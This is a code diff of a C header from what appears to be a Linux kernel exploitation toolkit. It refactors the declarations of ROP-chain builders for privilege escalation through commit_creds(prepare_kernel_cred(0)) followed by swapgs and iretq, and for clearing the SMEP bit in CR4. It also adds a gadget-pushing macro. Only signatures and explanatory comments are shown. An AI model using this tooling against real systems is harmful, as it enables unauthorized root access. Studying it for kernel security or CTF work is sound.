@@ -6,7 +6,64 @@
 #include "privesc.h"
 #include "ret2user.h"
 
+/* Typedef a struct for rop chain rop[]
+ *      to avoid bug when copying 0 from the chain to buffer
+ *
+ * ALWAYS use a struct when overflowing a buffer with ROP!
+ *      We concept the stuct as 'rop', 
+ *      while the raw rop chain as 'chain'
+ * */
+typedef struct {
+    uintptr_t *chain;
+    size_t count;
+} rop_chain_t;
+
+
+/* ============= Kcreds Commit =============
+ * Privesc with commit_creds(prepare_kernel_cred(0));
+ *      then call iretq (from kernel codes) to return to user space
+
+ * prepare_kernel_cred -> commit_creds -> swapgs -> iretq
+ * */
+size_t chain_kcred_iretq(rop_chain_t rop,
+                        uintptr_t pop_rdi_ret,
+                        uintptr_t prepare_kernel_cred,
+                        rop_chain_t mov_rdi_rax_chain,
+                        uintptr_t commit_creds,
+                        uintptr_t swapgs_pop_rbp_ret,
+                        uintptr_t iretq,
+                        iretq_user_ctx_t ctx);
+
+
+/* ============= CR4 Hijack =============
+ * CR4 is a 64-bit control register, 
+ *      whewre each bit enables or disables certain CPU features.
+ *      
+ * Bit 20 (1 << 20) controls SMEP - 1 for on, 0 for off.
+ *
+ * [!] But this is patched since Linux 5.1 in May 2019
+ *      native_write_cr4() now ensures that once CR4 is set,
+ *      those bits cannot be cleared via ROP or other direct writes
+ *
+ * This works only for Linux 4.* and older.
+ * */ 
+
+/* Chain up to zero out 20th bit of CR4 */
+size_t chain_cr4_smep(rop_chain_t rop, 
+                    uintptr_t pop_rdi_ret,
+                    uintptr_t cr4_val,
+                    uintptr_t mov_cr4_rdi_ret,
+                    uintptr_t ret_addr);
+
+
 /* ============= ROP Helpers ==============*/
+
+/* Push gadgets onto an ROP chain (rop_chain_t) */
+#define PUSH_ROP(dst, pos, gadget) do {                    \
+    if ((pos) >= (dst).count)                              \
+        DIE("ROP buffer overflow at %s:%d", __FILE__, __LINE__); \
+    (dst).chain[(pos)++] = (gadget);                       \
+} while (0)
 
 /*
  * append_chain - Concatenate an ROP chain fragment into a larger chain.
@@ -44,43 +101,6 @@ size_t append_chain(uintptr_t *dst,
                     size_t *off,
                     const uintptr_t *src,
                     size_t src_len);
-
-
-/* ============= Kcreds Commit =============
- * Privesc with commit_creds(prepare_kernel_cred(0));
- *      then call iretq (from kernel codes) to return to user space
-
- * prepare_kernel_cred -> commit_creds -> swapgs -> iretq
- * */
-size_t chain_kcred_iretq(uintptr_t *rop,
-                        uintptr_t pop_rdi_ret,
-                        uintptr_t prepare_kernel_cred,
-                        const uintptr_t *mov_rdi_rax_chain,
-                        uintptr_t commit_creds,
-                        uintptr_t swapgs_pop_rbp_ret,
-                        uintptr_t iretq,
-                        iretq_user_ctx_t ctx);
-
-
-/* ============= CR4 Hijack =============
- * CR4 is a 64-bit control register, 
- *      whewre each bit enables or disables certain CPU features.
- *      
- * Bit 20 (1 << 20) controls SMEP - 1 for on, 0 for off.
- *
- * [!] But this is patched since Linux 5.1 in May 2019
- *      native_write_cr4() now ensures that once CR4 is set,
- *      those bits cannot be cleared via ROP or other direct writes
- *
- * This works only for Linux 4.* and older.
- * */ 
-
-/* Chain up to zero out 20th bit of CR4 */
-size_t chain_cr4_smep(uintptr_t *rop, 
-                    uintptr_t pop_rdi_ret,
-                    uintptr_t cr4_val,
-                    uintptr_t mov_cr4_rdi_ret,
-                    uintptr_t ret_addr);
 
 
 #endif
